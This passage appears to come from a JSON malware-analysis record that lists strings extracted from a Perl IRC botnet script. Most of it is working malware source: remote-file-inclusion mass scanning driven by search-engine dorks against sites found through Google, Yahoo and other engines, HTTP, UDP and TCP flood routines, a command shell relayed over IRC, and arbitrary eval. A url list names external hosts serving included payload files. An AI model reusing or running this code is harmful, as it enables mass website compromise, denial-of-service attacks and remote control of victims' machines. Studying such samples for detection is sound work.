            "12$print \");",
            "exit;",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "\tmy @fireball=&fireball($dork);",
            "push(my @tot, @fireball );",
            "my @puliti=&unici(@tot);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4fiRebaLL",
            "\".scalar(@tot).\" ",
            "3sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4fiRebaLL",
            "7 wE have cLeaNed ",
            "\".scalar(@puliti).\" ",
            "3sites\");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %50==0){",
            "#sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "3Exploiting",
            "1 \".$contatore.\" ",
            "1 \".$uni. \" ",
            "3Sites\");",
            "if ($contatore==$uni-1){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4fiRebaLL",
            "7 sCaN fiNniShed for $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(7);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /Osirys/ && $re =~ /id:/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "4$print \");",
            "elsif($re =~ /Osirys/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "12$print \");",
            "exit;",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "\tmy @guruji=&guruji($dork);",
            "push(my @tot, @guruji );",
            "my @puliti=&unici(@tot);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4guRuji",
            "\".scalar(@tot).\" ",
            "3sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4guRuji",
            "7 wE have cLeaNed ",
            "\".scalar(@puliti).\" ",
            "3sites\");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %50==0){",
            "#sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "3Exploiting",
            "1 \".$contatore.\" ",
            "1 \".$uni. \" ",
            "3Sites\");",
            "if ($contatore==$uni-1){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4guRuji",
            "7 sCaN fiNniShed for $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(7);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /Osirys/ && $re =~ /id:/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "4$print \");",
            "elsif($re =~ /Osirys/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "12$print \");",
            "exit;",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "\tmy @mozbot=&mozbot($dork);",
            "push(my @tot, @mozbot );",
            "my @puliti=&unici(@tot);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4mOzBot",
            "\".scalar(@tot).\" ",
            "3sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4mOzBot",
            "7 wE have cLeaNed ",
            "\".scalar(@puliti).\" ",
            "3sites\");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %50==0){",
            "#sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "3Exploiting",
            "1 \".$contatore.\" ",
            "1 \".$uni. \" ",
            "3Sites\");",
            "if ($contatore==$uni-1){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4mOzBot",
            "7 sCaN fiNniShed for $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(7);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /Osirys/ && $re =~ /id:/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "4$print \");",
            "elsif($re =~ /Osirys/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "12$print \");",
            "exit;",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "\tmy @ylist=&yahoo($dork);",
            "\tmy @yalist=&yahooa($dork);",
            "\tmy @yblist=&yahoob($dork);",
            "\tmy @yclist=&yahooc($dork);",
            "\tmy @ydlist=&yahood($dork);",
            "\t\tpush(my @yahoobypass, @ylist, @yalist, @yblist, @yclist, @ydlist );",
            "push(my @tot, @yahoobypass );",
            "my @puliti=&unici(@tot);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4yaHoo",
            "\".scalar(@tot).\" ",
            "3sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4yaHoo",
            "7 wE have cLeaNed ",
            "\".scalar(@puliti).\" ",
            "3sites\");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %50==0){",
            "#sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "3Exploiting",
            "1 \".$contatore.\" ",
            "1 \".$uni. \" ",
            "3Sites\");",
            "if ($contatore==$uni-1){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4yaHoo",
            "7 sCaN fiNniShed for $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(7);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /Osirys/ && $re =~ /id:/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "4$print \");",
            "elsif($re =~ /Osirys/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "12$print \");",
            "exit;",
            "######################",
            "#     HTTPFlood      #",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^httpflood\\s+(.*)\\s+(\\d+)/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2HttpFlood",
            "3 Attacking",
            "14 \".$1.\" ",
            "2 on port 80 for ",
            "14 \".$2.\" ",
            "3 seconds ",
            ".\");",
            "my $itime = time;",
            "my ($cur_time);",
            "$cur_time = time - $itime;",
            "while ($2>$cur_time){",
            "$cur_time = time - $itime;",
            "my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);",
            "print $socket \"GET / HTTP/1.1\\r\\nAccept: */*\\r\\nHost: \".$1.\"\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";",
            "close($socket);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2HttpFlood",
            "3 Attacking selesai",
            "14 \".$1.\".\");",
            "######################",
            "#  End of HTTPFlood  #",
            "#                    #",
            "######################",
            "######################",
            "#     UDPFlood       #",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^udpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2UDPFlood",
            "3 Attacking ",
            "14 \".$1.\" ",
            "3 with ",
            "4 \".$2.\" ",
            "3 Kb Packets for ",
            "14 \".$3.\" ",
            "3 seconds.",
            "my ($dtime, %pacotes) = udpflooder(\"$1\", \"$2\", \"$3\");",
            "$dtime = 1 if $dtime == 0;",
            "my %bytes;",
            "$bytes{igmp} = $2 * $pacotes{igmp};",
            "$bytes{icmp} = $2 * $pacotes{icmp};",
            "$bytes{o} = $2 * $pacotes{o};",
            "$bytes{udp} = $2 * $pacotes{udp};",
            "$bytes{tcp} = $2 * $pacotes{tcp};",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2UDPFlood",
            "3 Results ",
            "14 \".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024).\" ",
            "3Kb in",
            "14 \".$dtime.\" ",
            "3seconds to",
            "14 \".$1.\".\");",
            "exit;",
            "######################",
            "#  End of Udpflood   #",
            "#                    #",
            "######################",
            "sub ircase {",
            "my ($kem, $printl, $case) = @_;",
            "  if ($case =~ /^join (.*)/) {",
            "     j(\"$1\");",
            "   }",
            "   if ($case =~ /^part (.*)/) {",
            "      p(\"$1\");",
            "   }",
            "if ($case =~ /^rejoin\\s+(.*)/) {",
            "my $chan = $1;",
            "if ($chan =~ /^(\\d+) (.*)/) {",
            "for (my $ca = 1; $ca <= $1; $ca++ ) {",
            "p(\"$2\");",
            "j(\"$2\");",
            "else {",
            "p(\"$chan\");",
            "j(\"$chan\");",
            "if ($case =~ /^op/) {",
            "op(\"$printl\", \"$kem\") if $case eq \"op\";",
            "my $oarg = substr($case, 3);",
            "op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "if ($case =~ /^deop/) {",
            "deop(\"$printl\", \"$kem\") if $case eq \"deop\";",
            "my $oarg = substr($case, 5);",
            "deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "if ($case =~ /^msg\\s+(\\S+) (.*)/) {",
            "msg(\"$1\", \"$2\");",
            "if ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "for (my $cf = 1; $cf <= $1; $cf++) {",
            "msg(\"$2\", \"$3\");",
            "if ($case =~ /^ctcp\\s+(\\S+) (.*)/) {",
            "ctcp(\"$1\", \"$2\");",
            "if ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "for (my $cf = 1; $cf <= $1; $cf++) {",
            "ctcp(\"$2\", \"$3\");",
            "if ($case =~ /^nick (.*)/) {",
            "nick(\"$1\");",
            "if ($case =~ /^connect\\s+(\\S+)\\s+(\\S+)/) {",
            "conectar(\"$2\", \"$1\", 6667);",
            "if ($case =~ /^raw (.*)/) {",
            "sendraw(\"$1\");",
            "if ($case =~ /^eval (.*)/) {",
            "eval \"$1\";",
            "sub shell {",
            "my $printl=$_[0];",
            "my $comando=$_[1];",
            "if ($comando =~ /cd (.*)/) {",
            "chdir(\"$1\") || msg(\"$printl\", \"No such file or directory\");",
            "return;",
            "elsif ($pid = fork) {",
            "waitpid($pid, 0);",
            "else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my @resp=`$comando 2>&1 3>&1`;",
            "my $c=0;",
            "foreach my $linha (@resp) {",
            "  $c++;",
            "  chop $linha;",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");",
            "  if ($c == \"$linas_max\") {",
            "    $c=0;",
            "    sleep $sleep;",
            "exit;",
            "sub tcpflooder {",
            "my $itime = time;",
            "my ($cur_time);",
            "my ($ia,$pa,$proto,$j,$l,$t);",
            "$ia=inet_aton($_[0]);",
            "$pa=sockaddr_in($_[1],$ia);",
            "$ftime=$_[2];",
            "$proto=getprotobyname('tcp');",
            "$j=0;$l=0;",
            "$cur_time = time - $itime;",
            "while ($l<1000){",
            "$cur_time = time - $itime;",
            "last if $cur_time >= $ftime;",
            "$t=\"SOCK$l\";",
            "socket($t,PF_INET,SOCK_STREAM,$proto);",
            "connect($t,$pa)||$j--;",
            "$j++;$l++;",
            "$l=0;",
            "while ($l<1000){",
            "$cur_time = time - $itime;",
            "last if $cur_time >= $ftime;",
            "$t=\"SOCK$l\";",
            "shutdown($t,2);",
            "$l++;",
            "sub udpflooder {",
            "my $iaddr = inet_aton($_[0]);",
            "my $msg = 'A' x $_[1];",
            "my $ftime = $_[2];",
            "my $cp = 0;",
            "my (%pacotes);",
            "$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;",
            "socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;",
            "socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;",
            "socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;",
            "socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;",
            "return(undef) if $cp == 4;",
            "my $itime = time;",
            "my ($cur_time);",
            "while ( 1 ) {",
            "for (my $porta = 1;",
            "$porta <= 65000; $porta++) {",
            "$cur_time = time - $itime;",
            "last if $cur_time >= $ftime;",
            "send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;",
            "send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;",
            "send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;",
            "send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;",
            "for (my $pc = 3;",
            "$pc <= 255;$pc++) {",
            "next if $pc == 6;",
            "$cur_time = time - $itime;",
            "last if $cur_time >= $ftime;",
            "socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;",
            "send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;",
            "last if $cur_time >= $ftime;",
            "return($cur_time, %pacotes);",
            "sub ctcp {",
            "return unless $#_ == 1;",
            "sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");",
            "sub msg {",
            "return unless $#_ == 1;",
            "sendraw(\"PRIVMSG $_[0] :$_[1]\");",
            "sub notice {",
            "return unless $#_ == 1;",
            "sendraw(\"NOTICE $_[0] :$_[1]\");",
            "sub op {",
            "return unless $#_ == 1;",
            "sendraw(\"MODE $_[0] +o $_[1]\");",
            "sub deop {",
            "return unless $#_ == 1;",
            "sendraw(\"MODE $_[0] -o $_[1]\");",
            "sub j {",
            "&join(@_);",
            "sub join {",
            "return unless $#_ == 0;",
            "sendraw(\"JOIN $_[0]\");",
            "sub p { part(@_);",
            "sub part {",
            "sendraw(\"PART $_[0]\");",
            "sub nick {",
            "return unless $#_ == 0;",
            "sendraw(\"NICK $_[0]\");",
            "sub quit {",
            "sendraw(\"QUIT :$_[0]\");",
            "sub fetch(){",
            "my $rnd=(int(rand(9999)));",
            "my $n= 80;",
            "if ($rnd<5000) { $n<<=1;}",
            "my $s= (int(rand(10)) * $n);",
            "my @dominios = (\"removed-them-all\");",
            "my @str;",
            "foreach $dom  (@dominios)",
            "push (@str,\"@gstring\");",
            "my $query=\"www.google.com/search?q=\";",
            "$query.=$str[(rand(scalar(@str)))];",
            "$query.=\"&num=$n&start=$s\";",
            "my @lst=();",
            "sendraw(\"privmsg #debug :DEBUG only test googling: \".$query.\"\");",
            "my $page = http_query($query);",
            "while ($page =~  m/<a href=\\\"?http:\\/\\/([^>\\\"]+)\\\"? class=l>/g){",
            "if ($1 !~ m/google|cache|translate/){",
            "push (@lst,$1);",
            "return (@lst);",
            "sub msn(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=1000;$b+=10){",
            "my $MsN=(\"http://search.live.com/results.aspx?q=\".key($key).\"&first=\".$b.\"&FORM=PERE\");",
            "my $Res=query($MsN);",
            "while($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){",
            "if($1 !~ /msn|live/){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub yahoo(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=1000;$b+=100){",
            "my $Ya=(\"http://search.yahoo.co.in/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);",
            "my $Res=query($Ya);",
            "while($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/<b>//g;",
            "$k=~s/<\\/b>//g;",
            "$k=~s/<wbr>//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub yahooa(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=210;$b<=1000;$b+=210){",
            "my $Ya=(\"http://search.yahoo.hk/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);",
            "my $Res=query($Ya);",
            "while($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/<b>//g;",
            "$k=~s/<\\/b>//g;",
            "$k=~s/<wbr>//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub yahoob(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=410;$b<=1000;$b+=210){",
            "my $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);",
            "my $Res=query($Ya);",
            "while($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/<b>//g;",
            "$k=~s/<\\/b>//g;",
            "$k=~s/<wbr>//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub yahooc(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=610;$b<=1000;$b+=210){",
            "my $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);",
            "my $Res=query($Ya);",
            "while($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/<b>//g;",
            "$k=~s/<\\/b>//g;",
            "$k=~s/<wbr>//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub yahood(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=810;$b<=1000;$b+=210){",
            "my $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);",
            "my $Res=query($Ya);",
            "while($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/<b>//g;",
            "$k=~s/<\\/b>//g;",
            "$k=~s/<wbr>//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub baidu(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=0;$b<=1000;$b+=50){",
            "my $baidu=(\"http://www.baidu.com/s?lm=0&si=&rn=50&wd=\".key($key).\"&pn=\".$b);",
            "my $Res=query($baidu);",
            "while($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){",
            "if ($1 !~ /google/){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub altavista(){ ",
            "my @lst; ",
            "my $key = $_[0]; ",
            "for($b=1;$b<=1000;$b+=10){ ",
            "my $AlT=(\"http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=\".key($key).\"&stq=\".$b); ",
            "my $Res=query($AlT); ",
            "while($Res=~m/<span class=ngrn>(.+?)\\//g){ ",
            "if($1 !~ /altavista/){ ",
            "my $k=$1; ",
            "$k=~s/<//g; ",
            "$k=~s/ //g; ",
            "my @grep=links($k); ",
            "push(@lst,@grep); ",
            "if ($Res =~ /target=\\\"_self\\\">Succ/){}",
            "else{return @lst;}",
            "return @lst; ",
            "sub naver(){ ",
            "my @lst; ",
            "my $key = $_[0]; ",
            "for($b=1;$b<=1000;$b+=10){ ",
            "my $naver=(\"http://web.search.naver.com/search.naver?where=webkr&query=\".key($key).\"&xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start=\".$i); ",
            "my $Res=query($naver); ",
            "while($Res =~ m/<a href=\\\"http:\\/\\/([^>\\\"]*)/g){ ",
            "my $k=$1; ",
            "if($k!~/busca|uol|yahoo/){ ",
            "my $k=$1; ",
            "my @grep=links($k); ",
            "push(@lst,@grep); ",
            "}}} ",
            "return @lst; ",
            "sub mozbot() ",
            "my @lst; ",
            "my $key=$_[0]; ",
            "my $i=0; ",
            "my $pg=0; ",
            "for($i=0; $i<=100; $i+=1) ",
            "my $mozbot=(\"http://www.mozbot.fr/search?q=\".key($key).\"&st=int&page=\".$i); ",
            "my $Res=query($mozbot); ",
            "while($Res =~ m/<a href=\\\"?http:\\/\\/(.+?)\\\" target/g){ ",
            "my $k=$1; ",
            "$k=~s/ //g; ",
            "my @grep=links($k); ",
            "push(@lst,@grep); ",
            "if ($Res =~ /Cliquez ici pour effectuer/)",
            "{return @lst;}",
            "return @lst; ",
            "sub uol(){ ",
            "my @lst; ",
            "my $key = $_[0]; ",
            "for($b=1;$b<=1000;$b+=10){ ",
            "my $UoL=(\"http://busca.uol.com.br/www/index.html?q=\".key($key).\"&start=\".$i); ",
            "my $Res=query($UoL); ",
            "while($Res =~ m/<a href=\\\"http:\\/\\/([^>\\\"]*)/g){ ",
            "my $k=$1; ",
            "if($k!~/busca|uol|yahoo/){ ",
            "my $k=$1; ",
            "my @grep=links($k); ",
            "push(@lst,@grep); ",
            "}}} ",
            "return @lst; ",
            "sub ask(){",
            "my @lst;",
            "my $key=$_[0];",
            "my $i=0;",
            "my $pg=0;",
            "for($i=0; $i<=1000; $i+=10)",
            "my $Ask=(\"http://it.ask.com/web?q=\".key($key).\"&o=312&l=dir&qsrc=0&page=\".$i.\"&dm=all\");",
            "my $Res=query($Ask);",
            "while($Res=~m/<a id=\\\"(.*?)\\\" class=\\\"(.*?)\\\" href=\\\"(.+?)\\onmousedown/g){",
            "my $k=$3;",
            "$k=~s/[\\\"\\ ]//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub alltheweb()",
            "my @lst;",
            "my $key=$_[0];",
            "my $i=0;",
            "my $pg=0;",
            "for($i=0; $i<=1000; $i+=100)",
            "my $all=(\"http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=\".key($key).\"&o=\".$i);",
            "my $Res=query($all);",
            "while($Res =~ m/<span class=\\\"?resURL\\\"?>http:\\/\\/(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/ //g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub google(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=0;$b<=1000;$b+=100){",
            "my $Go=(\"http://www.google.com/search?hl=en&q=\".key($key).\"&meta=&num=100&filter=0&start=\".$b);",
            "my $Res=query($Go);",
            "while($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){",
            "if ($1 !~ /google/){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub guruji(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=0;$b<=1000;$b+=10){",
            "my $guruji=(\"http://www.guruji.com/search?q=\".key($key).\"&s=\".$b);",
            "my $Res=query($guruji);",
            "while($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){",
            "if ($1 !~ /google/){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub fireball(){",
            "my $key=$_[0];",
            "my $inizio=1;",
            "my $pagine=200;",
            "my @lst;",
            "my $av=0;",
            "while($inizio <= $pagine){",
            "my $fireball=\"http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=\".key($key).\"&cat=fb_loc&idx=all&enc=utf-8\";",
            "my $Res=query($fireball);",
            "while ($Res=~ m/<a href=\\\"?http:\\/\\/(.+?)\\//g ){",
            "if ($1 !~ /msn|live|google|yahoo/){",
            "my $k=\"$1/\";",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "$av=$av+10;",
            "$inizio++;",
            "return @lst;",
            "sub links()",
            "my @l;",
            "my $link=$_[0];",
            "my $host=$_[0];",
            "my $hdir=$_[0];",
            "$hdir=~s/(.*)\\/[^\\/]*$/\\1/;",
            "$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;",
            "$host.=\"/\";",
            "$link.=\"/\";",
            "$hdir.=\"/\";",
            "$host=~s/\\/\\//\\//g;",
            "$hdir=~s/\\/\\//\\//g;",
            "$link=~s/\\/\\//\\//g;",
            "push(@l,$link,$host,$hdir);",
            "return @l;",
            "sub geths(){",
            "my $host=$_[0];",
            "$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;",
            "return $host;",
            "sub key(){",
            "my $chiave=$_[0];",
            "$chiave =~ s/ /\\+/g;",
            "$chiave =~ s/:/\\%3A/g;",
            "$chiave =~ s/\\//\\%2F/g;",
            "$chiave =~ s/&/\\%26/g;",
            "$chiave =~ s/\\\"/\\%22/g;",
            "$chiave =~ s/,/\\%2C/g;",
            "$chiave =~ s/\\\\/\\%5C/g;",
            "return $chiave;",
            "sub query($){",
            "my $url=$_[0];",
            "$url=~s/http:\\/\\///;",
            "my $host=$url;",
            "my $query=$url;",
            "my $page=\"\";",
            "$host=~s/href=\\\"?http:\\/\\///;",
            "$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;",
            "$query=~s/$host//;",
            "if ($query eq \"\") {$query=\"/\";};",
            "eval {",
            "my $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;",
            "print $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";",
            "my @r = <$sock>;",
            "$page=\"@r\";",
            "close($sock);",
            "return $page;",
            "sub unici{",
            "my @unici = ();",
            "my %visti = ();",
            "foreach my $elemento ( @_ )",
            "next if $visti{ $elemento }++;",
            "push @unici, $elemento;",
            "return @unici;",
            "sub http_query($){",
            "my ($url) = @_;",
            "my $host=$url;",
            "my $query=$url;",
            "my $page=\"\";",
            "$host =~ s/href=\\\"?http:\\/\\///;",
            "$host =~ s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;",
            "$query =~s/$host//;",
            "if ($query eq \"\") {$query=\"/\";};",
            "eval {",
            "local $SIG{ALRM} = sub { die \"1\";};",
            "alarm 10;",
            "my $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;",
            "print $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";",
            "my @r = <$sock>;",
            "$page=\"@r\";",
            "alarm 0;",
            "close($sock);",
            "return $page;"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.greenhealth-bg.com///administrator/components/com_virtuemart/html/id.txt?",
            "http://www.guruji.com/search?q=",
            "http://search.yahoo.hk/search?ei=UTF-8&p=",
            "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=",
            "http://kendall-web-lab.com/h.txt?",
            "http://www.mozbot.fr/search?q=",
            "http://search.live.com/results.aspx?q=",
            "http://search.yahoo.co.in/search?ei=UTF-8&p=",
            "http://web.search.naver.com/search.naver?where=webkr&query=",
            "http://search.yahoo.com/search?ei=UTF-8&p=",
            "http://www.google.com/search?hl=en&q=",
            "http://milw0rm.com/rss.php",
            "http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=",
            "http://busca.uol.com.br/www/index.html?q=",
            "http://www.milw0rm.com/exploits/1",
